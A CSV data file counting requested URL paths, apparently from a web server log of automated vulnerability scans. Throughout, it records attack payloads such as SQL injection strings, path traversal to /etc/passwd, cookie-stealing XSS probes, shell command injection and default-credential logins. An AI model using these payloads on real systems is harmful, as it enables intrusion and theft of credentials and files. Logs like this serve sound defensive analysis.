Frequency,Resource
1,"/postnuke/html/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/*"
1,webplus?about
1,/oc/Search/SQLQHit.asp
1,shop.cgi?page=../../../../../../../etc/passwd
1,/TvLBvkHh.pl
1,/TvLBvkHh.pm
1,/cgi-bin/infosrch.cgi
1,/TvLBvkHh.zip
1,/TvLBvkHh.pw
1,/TvLBvkHh.xml
1,/search.asp?term=<%00script>alert('Vulnerable')</script>
1,dbman/db.cgi?db=no-db
1,/index.php?download=/windows/win.ini
1,/cgi-bin/perl
1,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%201077%2C1077%2CCONCAT%280x716a6b7671%2C0x61664f5a5356494462534963514e4f744b6a7444496c5a7a4864764f6770566e70476e436d754a4c%2C0x71627a6a71%29%2C1077%2C1077%23
1,/servlets/SchedulerTransfer
1,/servlet/org.apache.catalina.Context/%3Cscript%3Ealert('Vulnerable')%3C/script%3E
1,/ROADS/cgi-bin/search.pl?form=../../../../../../../../../../etc/passwd%00
1,/userinfo.php?uid=1;
2,/.well-known/security.txt
1,/examples/servlet/AUX
1,/main.php?basepath=%29%29%29%20AND%206033%3DBENCHMARK%285000000%2CMD5%280x70695854%29%29%23
1,ss
1,/TvLBvkHh.config
1,/cgi-local/cgiemail-1.6/cgicso?query=<script>alert('Vulnerable')</script>
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/_mem_bin/remind.asp
1,/provisioning/spa/
5,/dbadmin/scripts/setup.php
1,/502/
2,horde/test.php
1,/main.php?basepath=%29%29%29%20OR%20NOT%208226%3D8984%23
1,/main.php?basepath=-2540%22%29%29%20AS%20lEcC%20WHERE%209440%3D9440%20OR%205746%3D5746%23
1,/cfdocs/cfcache.map
1,/main.php?basepath=-9224%29%29%29%20UNION%20ALL%20SELECT%206153%2C6153%2C6153%2C6153%2C6153%2C6153%2C6153%2C6153%2C6153%2C6153%2C6153%2C6153%2C6153%2C6153%2C6153%2C6153%2C6153%2C6153%2C6153%2C6153%2C6153%2C6153%2C6153%2C6153%2C6153%2C6153%2C6153%2C6153%2C6153%2C6153%2C6153%2C6153%2C6153%2C6153%2C6153%23
1,/main.php?basepath=-2847%29%29%29%20UNION%20ALL%20SELECT%209655%2C9655%2C9655%2C9655%2C9655%2C9655%2C9655%2C9655%2C9655%2C9655%2C9655%2C9655%2C9655%2C9655%2C9655%2C9655%2C9655%2C9655%2C9655%2C9655%2C9655%2C9655%2C9655%2C9655%2C9655%2C9655%2C9655%2C9655%2C9655%2C9655%2C9655%2C9655%2C9655%2C9655%2C9655%2C9655%2C9655%2C9655%2C9655%2C9655%2C9655%2C9655%2C9655%2C9655%23
1,/TvLBvkHh.UploadServlet
1,/adm/config.php
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/TvLBvkHh.tml
1,/main.php?basepath=%25%27%29%20AND%201916%3D1916%23
1,bannereditor.cgi
1,"/SiteServer/Knowledge/Default.asp?ctr=\""><script>alert('Vulnerable')</script>"
1,/main.php?basepath=%22%29%29%29%20AND%202388%3D1769%23
1,"alibaba.pl%7Cdir%20..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C,"
1,/TvLBvkHh.tmp
1,/sshome/
1,store/index.cgi?page=../../../../../../../../etc/passwd
1,/cgi-bin/probecontrol.cgi?command=enable&username=cancer&password=killer
1,/TvLBvkHh.var
1,/index.php?catid=&lt;script&gt;alert('Vulnerable')&lt;/script&gt;
1,/webcart/config/clients.txt
1,/spip/
1,/main.php?basepath=-6850%29%29%29%20UNION%20ALL%20SELECT%204632%2C4632%2C4632%2C4632%2C4632%2C4632%2C4632%2C4632%2C4632%2C4632%2C4632%2C4632%2C4632%2C4632%2C4632%2C4632%2C4632%2C4632%2C4632%2C4632%2C4632%2C4632%2C4632%2C4632%2C4632%2C4632%2C4632%2C4632%2C4632%2C4632%2C4632%2C4632%2C4632%2C4632%2C4632%2C4632%2C4632%2C4632%2C4632%2C4632%2C4632%2C4632%2C4632%2C4632%2C4632%2C4632%2C4632%2C4632%2C4632%2C4632%2C4632%2C4632%2C4632%2C4632%23
1,/main.php?basepath=-1600%27%29%20OR%205746%3D5746%23
1,/cgi-bin/finger.pl
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%202771%2CCONCAT%280x716a6b7671%2C0x744d587559436842484c73426a4e654a6b53626864494d7043596e796678744d6668494d4a526b77%2C0x71627a6a71%29%2C2771%2C2771%2C2771%23
1,mt/mt.cfg
1,/tftp/
1,opendir.php?/etc/passwd
1,/cgi-bin/title.cgi
1,/main.php?basepath=-6318%29%29%20OR%209306%3D9389%23
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/shopdbtest.asp
1,/billing/billing.apw
1,/cgi/cfdocs/expeval/ExprCalc.cfm?OpenFilePath=c:\winnt\win.ini
1,/mpcsoftweb_guestbook/database/mpcsoftweb_guestdata.mdb
1,redirect
2,/LOGIN.PWD
1,/servlet/sunexamples.BBoardServlet
9,/phpmyadmin/scripts/setup.php
1,/main.php?basepath=-5871%29%29%20AS%20mGgW%20WHERE%208871%3D8871%20OR%205746%3D5746%23
1,/main.php?basepath=%25%27%29%29%29%20AND%201916%3D1916%23
1,/cgi-bin/test.bat?|dir%20..\\..\\..\\..\\..\\..\\..\\..\\..\\
1,/nsn/fdir.bas
1,/main.php?basepath=%29%29%29%20AND%20SLEEP%285%29%20AND%20%28%28%281966%3D1966
1,/TvLBvkHh.org
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/cgi-bin/multihtml.pl?multi=/etc/passwd%00html
1,/iissamples/issamples/sqlqhit.asp
1,/TvLBvkHh.snp
1,/main.php?basepath=-8008%29%29%29%20UNION%20ALL%20SELECT%203169%2C3169%2C3169%2C3169%2C3169%2C3169%2C3169%2C3169%2C3169%2C3169%2C3169%2C3169%2C3169%2C3169%2C3169%2C3169%2C3169%2C3169%2C3169%2C3169%2C3169%2C3169%2C3169%2C3169%2C3169%2C3169%2C3169%2C3169%2C3169%2C3169%2C3169%2C3169%2C3169%2C3169%2C3169%2C3169%2C3169%2C3169%2C3169%2C3169%2C3169%2C3169%2C3169%2C3169%2C3169%2C3169%2C3169%2C3169%2C3169%2C3169%23
1,.access
1,/cgi-bin/nph-showlogs.pl?files=../../&filter=.*&submit=Go&linecnt=500&refresh=0
1,/phoneprov.conf/
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/vgn/asp/status
1,bigconf.cgi?command=view_textfile&file=/etc/passwd&filters=
1,/goform/CheckLogin?login=root&password=tslinux
1,/cgi-bin/store/index.cgi?page=../../../../../../../../etc/passwd
1,/setup.exe?<script>alert('Vulnerable')</script>&page=list_users&user=P
1,/servlet/SchedulerTransfer
1,/main.php?basepath=-2388%29%29%29%20UNION%20ALL%20SELECT%206996%2C6996%2C6996%2C6996%2C6996%2C6996%2C6996%2C6996%2C6996%2C6996%2C6996%2C6996%2C6996%2C6996%2C6996%2C6996%2C6996%2C6996%2C6996%2C6996%2C6996%2C6996%2C6996%2C6996%2C6996%2C6996%2C6996%2C6996%2C6996%2C6996%2C6996%2C6996%2C6996%2C6996%2C6996%2C6996%2C6996%2C6996%2C6996%2C6996%2C6996%2C6996%2C6996%2C6996%2C6996%2C6996%2C6996%2C6996%2C6996%2C6996%2C6996%2C6996%2C6996%2C6996%2C6996%2C6996%2C6996%2C6996%2C6996%23
1,astrocam.cgi
1,/main.php?basepath=-5263%29%29%29%20UNION%20ALL%20SELECT%207904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%2C7904%23
1,/main.php?basepath=%29%29%29%20OR%20ELT%286684%3D6684%2CSLEEP%285%29%29%20AND%20%28%28%286492%3D6492
1,/samples/search.dll?query=<script>alert(document.cookie)</script>
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/cgi-bin/test-env
1,/cgi-bin/bizdb1-search.cgi
5,MsmMask.exe?mask=/junk334
1,/html/chatheader.php?mainfile=anything&Default_Theme='<script>alert(document.cookie);</script>
1,/help/
1,/cgi-bin/faxsurvey?cat%20/etc/passwd
2,/cgi-bin/cgiwrap/~mysql
1,/ssi/envout.bat?|dir%20..\\..\\..\\..\\..\\..\\..\\
1,/%00
1,snorkerz.cmd
1,/main.php?basepath=%2C%27%29%29%22%22%28%27%27%28
1,/cgi-bin/.cobalt/message/message.cgi?info=%3Cscript%3Ealert%28%27alert%27%29%3B%3C/script%3E
1,/cgi-bin/guestbook.cgi
1,/scripts/
1,/main.php?basepath=%29%20AND%207139%3D7139%20AND%20%283411%3D3411
1,/cartcart.cgi
1,/nsn/..%5Cutil/del.bas
1,cart32.exe
1,mkilog.exe
1,/vgn/legacy/save
1,/cgi-bin/gm-cplog.cgi
1,/cgi-bin/
1,/contents.php?new_language=elvish&mode=select
1,/cgi-bin/whois/whois.cgi?lookup=;&ext=/bin/cat%20/etc/passwd
1,/pap2t/
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,"/nice%20ports,/Trinity.txt.bak"
1,websendmail
1,/html/cgi-bin/cgicso?query=<script>alert('Vulnerable')</script>
1,/cgi-bin/webplus?about
1,/cgi-bin/cgi_process
1,/cgi-bin/DCShop/orders/orders.txt
1,/modules.php?op=modload&name=Web_Links&file=index&l_op=viewlink&cid=<script>alert('Vulnerable')</script>
1,stats/statsbrowse.asp?filepath=c:\&Opt=3
1,/friend.php?op=SiteSent&fname=<script>alert('Vulnerable')</script>
1,/Admin_files/order.log
44,/favicon.ico
1,/main.php?basepath=%29%29%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%285947%2CCONCAT%280x5c%2C%28BENCHMARK%285000000%2CMD5%280x546e686c%29%29%29%29%29%2C1%29%23
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/linksys/
1,csGuestBook.cgi?command=savesetup&setup=;system('cat%20/etc/passwd')
1,/TvLBvkHh.asp+
1,/modules.php?op=modload&name=News&file=index&catid=&topic=><script>alert('Vulnerable');</script>;
1,/main.php?basepath=%25%27%20AND%209247%3D4916%23
1,/index.php?download=/winnt/win.ini
1,"/phpwebsite/index.php?module=calendar&calendar[view]=day&month=2&year=2003&day=1+%00\""><script>alert('Vulnerable')</script>"
1,/phptonuke.php?filnavn=/etc/passwd
1,perlshop.cgi
1,/forum_members.asp?find=%22;}alert(9823);function%20x(){v%20=%22
1,/horde/test.php
1,/cgi-bin/cgiforum.pl?thesection=../../../../../../../../../../etc/passwd%00
1,/sipura/
1,/main.php?basepath=-8589%29%29%29%20UNION%20ALL%20SELECT%208943%2C8943%2C8943%2C8943%2CCONCAT%280x716a6b7671%2C0x645959636847586c476948565467574b4c4873547151716562644751737662644d7a6d6f4a78555a%2C0x71627a6a71%29%23
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/~root
1,/scripts/samples/search/simple.idq
1,/TvLBvkHh.aspx
1,/TvLBvkHh.gz
1,/TvLBvkHh.prf
2,/admin/pma/index.php
1,emu/html/emumail.cgi?type=/../../../../../../../../../../../../../../../../etc/passwd%00
1,/DB4Web/10.10.10.10:100
1,/guestbook/?number=5&lng=%3Cscript%3Ealert(document.domain);%3C/script%3E
1,/cgi-bin/emumail.cgi?type=/../../../../../../../../../../../../../../../../etc/passwd%00
1,/main.php?basepath=%20AND%207139%3D7139--%20SxYT
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/main.php?basepath=-1307%25%22%29%20OR%205746%3D5746%23
1,/vgn/jsp/controller
1,/exchange/lib/LANG.INC
1,/index.php?l=forum/view.php&topic=../../../../../../../../../etc/passwd
1,/main.php?basepath=-8232%27%20OR%205746%3D5746%23
1,archie
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,"/search.php?searchfor=\""><script>alert(1776)</script>"
1,/nsn/..%5Cutil/userlist.bas
1,/cleartrust/ct_logon.asp?CTLoginErrorMsg=<script>alert(1)</script>
1,/admin.cgi
1,uptime
1,/cgi-bin/technote/main.cgi?board=FREE_BOARD&command=down_load&fileNikto=/../../../../../../../../../../etc/passwd
1,.cobalt
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/webamil/test.php?mode=phpinfo
2,/x
1,/siteminder/smadmin.html
1,/cgi-bin/SGB_DIR/superguestconfig
1,/exchange/lib/ATTACH.INC
1,/RELEASE-NOTES.txt
1,/vgn/ac/delete
1,/cgi-bin/formmail.cgi
1,/TvLBvkHh.js0x70
1,/categorie.php3?cid=june
1,/cgi-bin/shtml.dll
1,/main.php?basepath=%29%29%29%20AND%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29lVMu%29%20AND%20%28%28%288996%3D8996
2,//
1,DCShop/orders/orders.txt
1,/main.php?basepath=-7168%22%29%20AS%20DPrI%20WHERE%206884%3D6884%20OR%205746%3D5746%23
1,/default.php?info_message=%3Cscript%20language=javascript%3Ewindow.alert%28document.cookie%29;%3C/script%3E
1,/main.php?basepath=-7970%27%29%29%20AS%20HWXE%20WHERE%209121%3D9121%20OR%205216%3D1566%23
1,/TvLBvkHh.ncf
1,/cgi-bin/webgais
5,/phpMyAdmin1/scripts/setup.php
1,/main.php?basepath=-2372%29%29%29%20UNION%20ALL%20SELECT%207865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%2C7865%23
1,/modules.php?op=modload&name=Members_List&file=index&letter=<script>alert('Vulnerable')</script>
5,/phpMyAdmin2/scripts/setup.php
2,/mysqladmin/index.php
1,AT-admin.cgi
1,/cgi-bin/Pbcgi.exe
1,/TvLBvkHh.map
1,/main.php?basepath=%27%29%20AS%20nZNw%20WHERE%209997%3D9997%20AND%201916%3D1916%23
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/main.php?basepath=-7136%29%29%29%20UNION%20ALL%20SELECT%208951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%2C8951%23
1,/tcb/files/auth/r/root
1,/index.php?|=../../../../../../../../../etc/passwd
1,/clusterframe.jsp
1,/main.php?basepath=-8638%29%29%29%20UNION%20ALL%20SELECT%203910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%2C3910%23
1,/cbms/changepass.php
2,/myadmin/index.php
1,/nsn/..%5Cweb/env.bas
1,alienform.cgi?_browser_out=.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2Fetc%2Fpasswd
1,/siteseed/
1,/cgi-bin/formmail
1,/forums//administrator/config.php
1,/cgi-bin/auction/auction.cgi?action=Sort_Page&View=Search&Page=0&Cat_ID=&Lang=English&Search=All&Terms=<script>alert('Vulnerable');</script>&Where=&Sort=Photo&Dir=
1,/cgi-bin/mmstdod.cgi
1,/main.php?basepath=-9580%29%29%29%20UNION%20ALL%20SELECT%207969%2C7969%2C7969%2C7969%2C7969%2C7969%2C7969%2C7969%2C7969%2C7969%2C7969%2C7969%2C7969%2C7969%2C7969%2C7969%2C7969%2C7969%2C7969%2C7969%2C7969%2C7969%2C7969%2C7969%2C7969%2C7969%2C7969%2C7969%2C7969%2C7969%2C7969%2C7969%2C7969%2C7969%2C7969%2C7969%2C7969%2C7969%2C7969%2C7969%2C7969%2C7969%2C7969%2C7969%2C7969%2C7969%2C7969%2C7969%2C7969%2C7969%2C7969%2C7969%2C7969%23
1,/cgi-bin/horde/test.php?mode=phpinfo
2,/cgi-bin/cgiwrap/~test
